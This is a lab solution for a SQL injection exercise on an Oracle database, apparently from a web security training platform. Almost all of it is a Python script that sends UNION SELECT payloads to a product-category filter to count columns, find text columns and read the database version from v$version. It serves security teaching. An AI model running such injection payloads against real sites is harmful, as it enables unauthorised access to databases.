# SQL injection attack, querying the database type and version on Oracle
> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

> To solve the lab, display the database version string.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Replace this with the specific lab URL when you run it
BASE_URL = "https://0a2f00f604b1e7c8805c080200f00098.web-security-academy.net/"
PATH = "/filter"
TARGET_URL = BASE_URL + PATH

def get_num_columns(url):
    """
    Determines the number of columns in the original query.
    Oracle requires 'FROM dual' when you aren't selecting from a real table.
    """
    print(f"[*] Probing {url} for column count...")
    for i in range(1, 50):
        # Create a list of NULLs (e.g., ['NULL', 'NULL'])
        null_list = ["NULL"] * i
        null_string = ", ".join(null_list)
        
        # Payload: ' UNION SELECT NULL, NULL FROM dual --
        payload = {"category": f"' UNION SELECT {null_string} FROM dual --"}
        
        sys.stdout.write(f"\r[-] Testing column count: {i}")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            print(f"\n[+] Found correct number of columns: {i}")
            return i
            
    print("\n[-] Error: Could not determine column count.")
    return None

def get_text_columns(url, num_columns):
    """
    Identifies which columns accept text (string) data.
    Oracle is strict about data types; putting text in a number column causes a crash.
    """
    print("[*] Identifying text-compatible columns...")
    text_columns = []
    
    for i in range(num_columns):
        # CRITICAL: We must create a FRESH list of NULLs for every iteration.
        # If we defined this outside the loop, previous tests would contaminate the current one.
        null_list = ["NULL"] * num_columns
        
        # Place a test string at the current index
        null_list[i] = "'abc'"
        null_string = ", ".join(null_list)
        
        # Payload: ' UNION SELECT 'abc', NULL FROM dual --
        payload = {"category": f"' UNION SELECT {null_string} FROM dual --"}
        
        sys.stdout.write(f"\r[-] Testing column index: {i}")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            text_columns.append(i)
            
    print(f"\n[+] Text columns found at indices: {text_columns}")
    return text_columns

def get_oracle_version(url, num_columns, text_col_indices):
    """
    Extracts the database version from the 'v$version' view (Oracle specific).
    """
    if not text_col_indices:
        print("[-] Error: No text columns available to hold the version string.")
        return

    print("[*] Extracting Oracle database version...")
    
    # We simply pick the first valid text column to hold our data
    target_index = text_col_indices[0]
    
    # Prepare the payload
    exploit_list = ["NULL"] * num_columns
    exploit_list[target_index] = "banner" # 'banner' is the column name in v$version
    exploit_string = ", ".join(exploit_list)
    
    # Payload: ' UNION SELECT banner, NULL FROM v$version --
    payload = {"category": f"' UNION SELECT {exploit_string} FROM v$version --"}
    
    response = requests.get(url, params=payload)
    
    if response.status_code == 200:
        print("[+] Injection Successful. Parsing version...")
        
        soup = BeautifulSoup(response.text, 'html.parser')

        # SIMPLIFIED PARSING:
        # Loop through all table headers (th) and cells (td)
        # to find the one containing the version info.
        found = False
        for tag in soup.find_all(['th', 'td']):
            if "Oracle" in tag.text:
                print(f"\n[SUCCESS] Database Version: {tag.text}")
                found = True
                break
        
        if not found:
            print("[-] Could not automatically find the version string.")
            print("[-] You may need to inspect the response manually.")

if __name__ == "__main__":
    # 1. Find how many columns there are
    num_columns = get_num_columns(TARGET_URL)
    
    if num_columns:
        # 2. Find which columns can hold text
        text_columns_list = get_text_columns(TARGET_URL, num_columns)
        
        if text_columns_list:
            # 3. Extract the Oracle version
            get_oracle_version(TARGET_URL, num_columns, text_columns_list)
```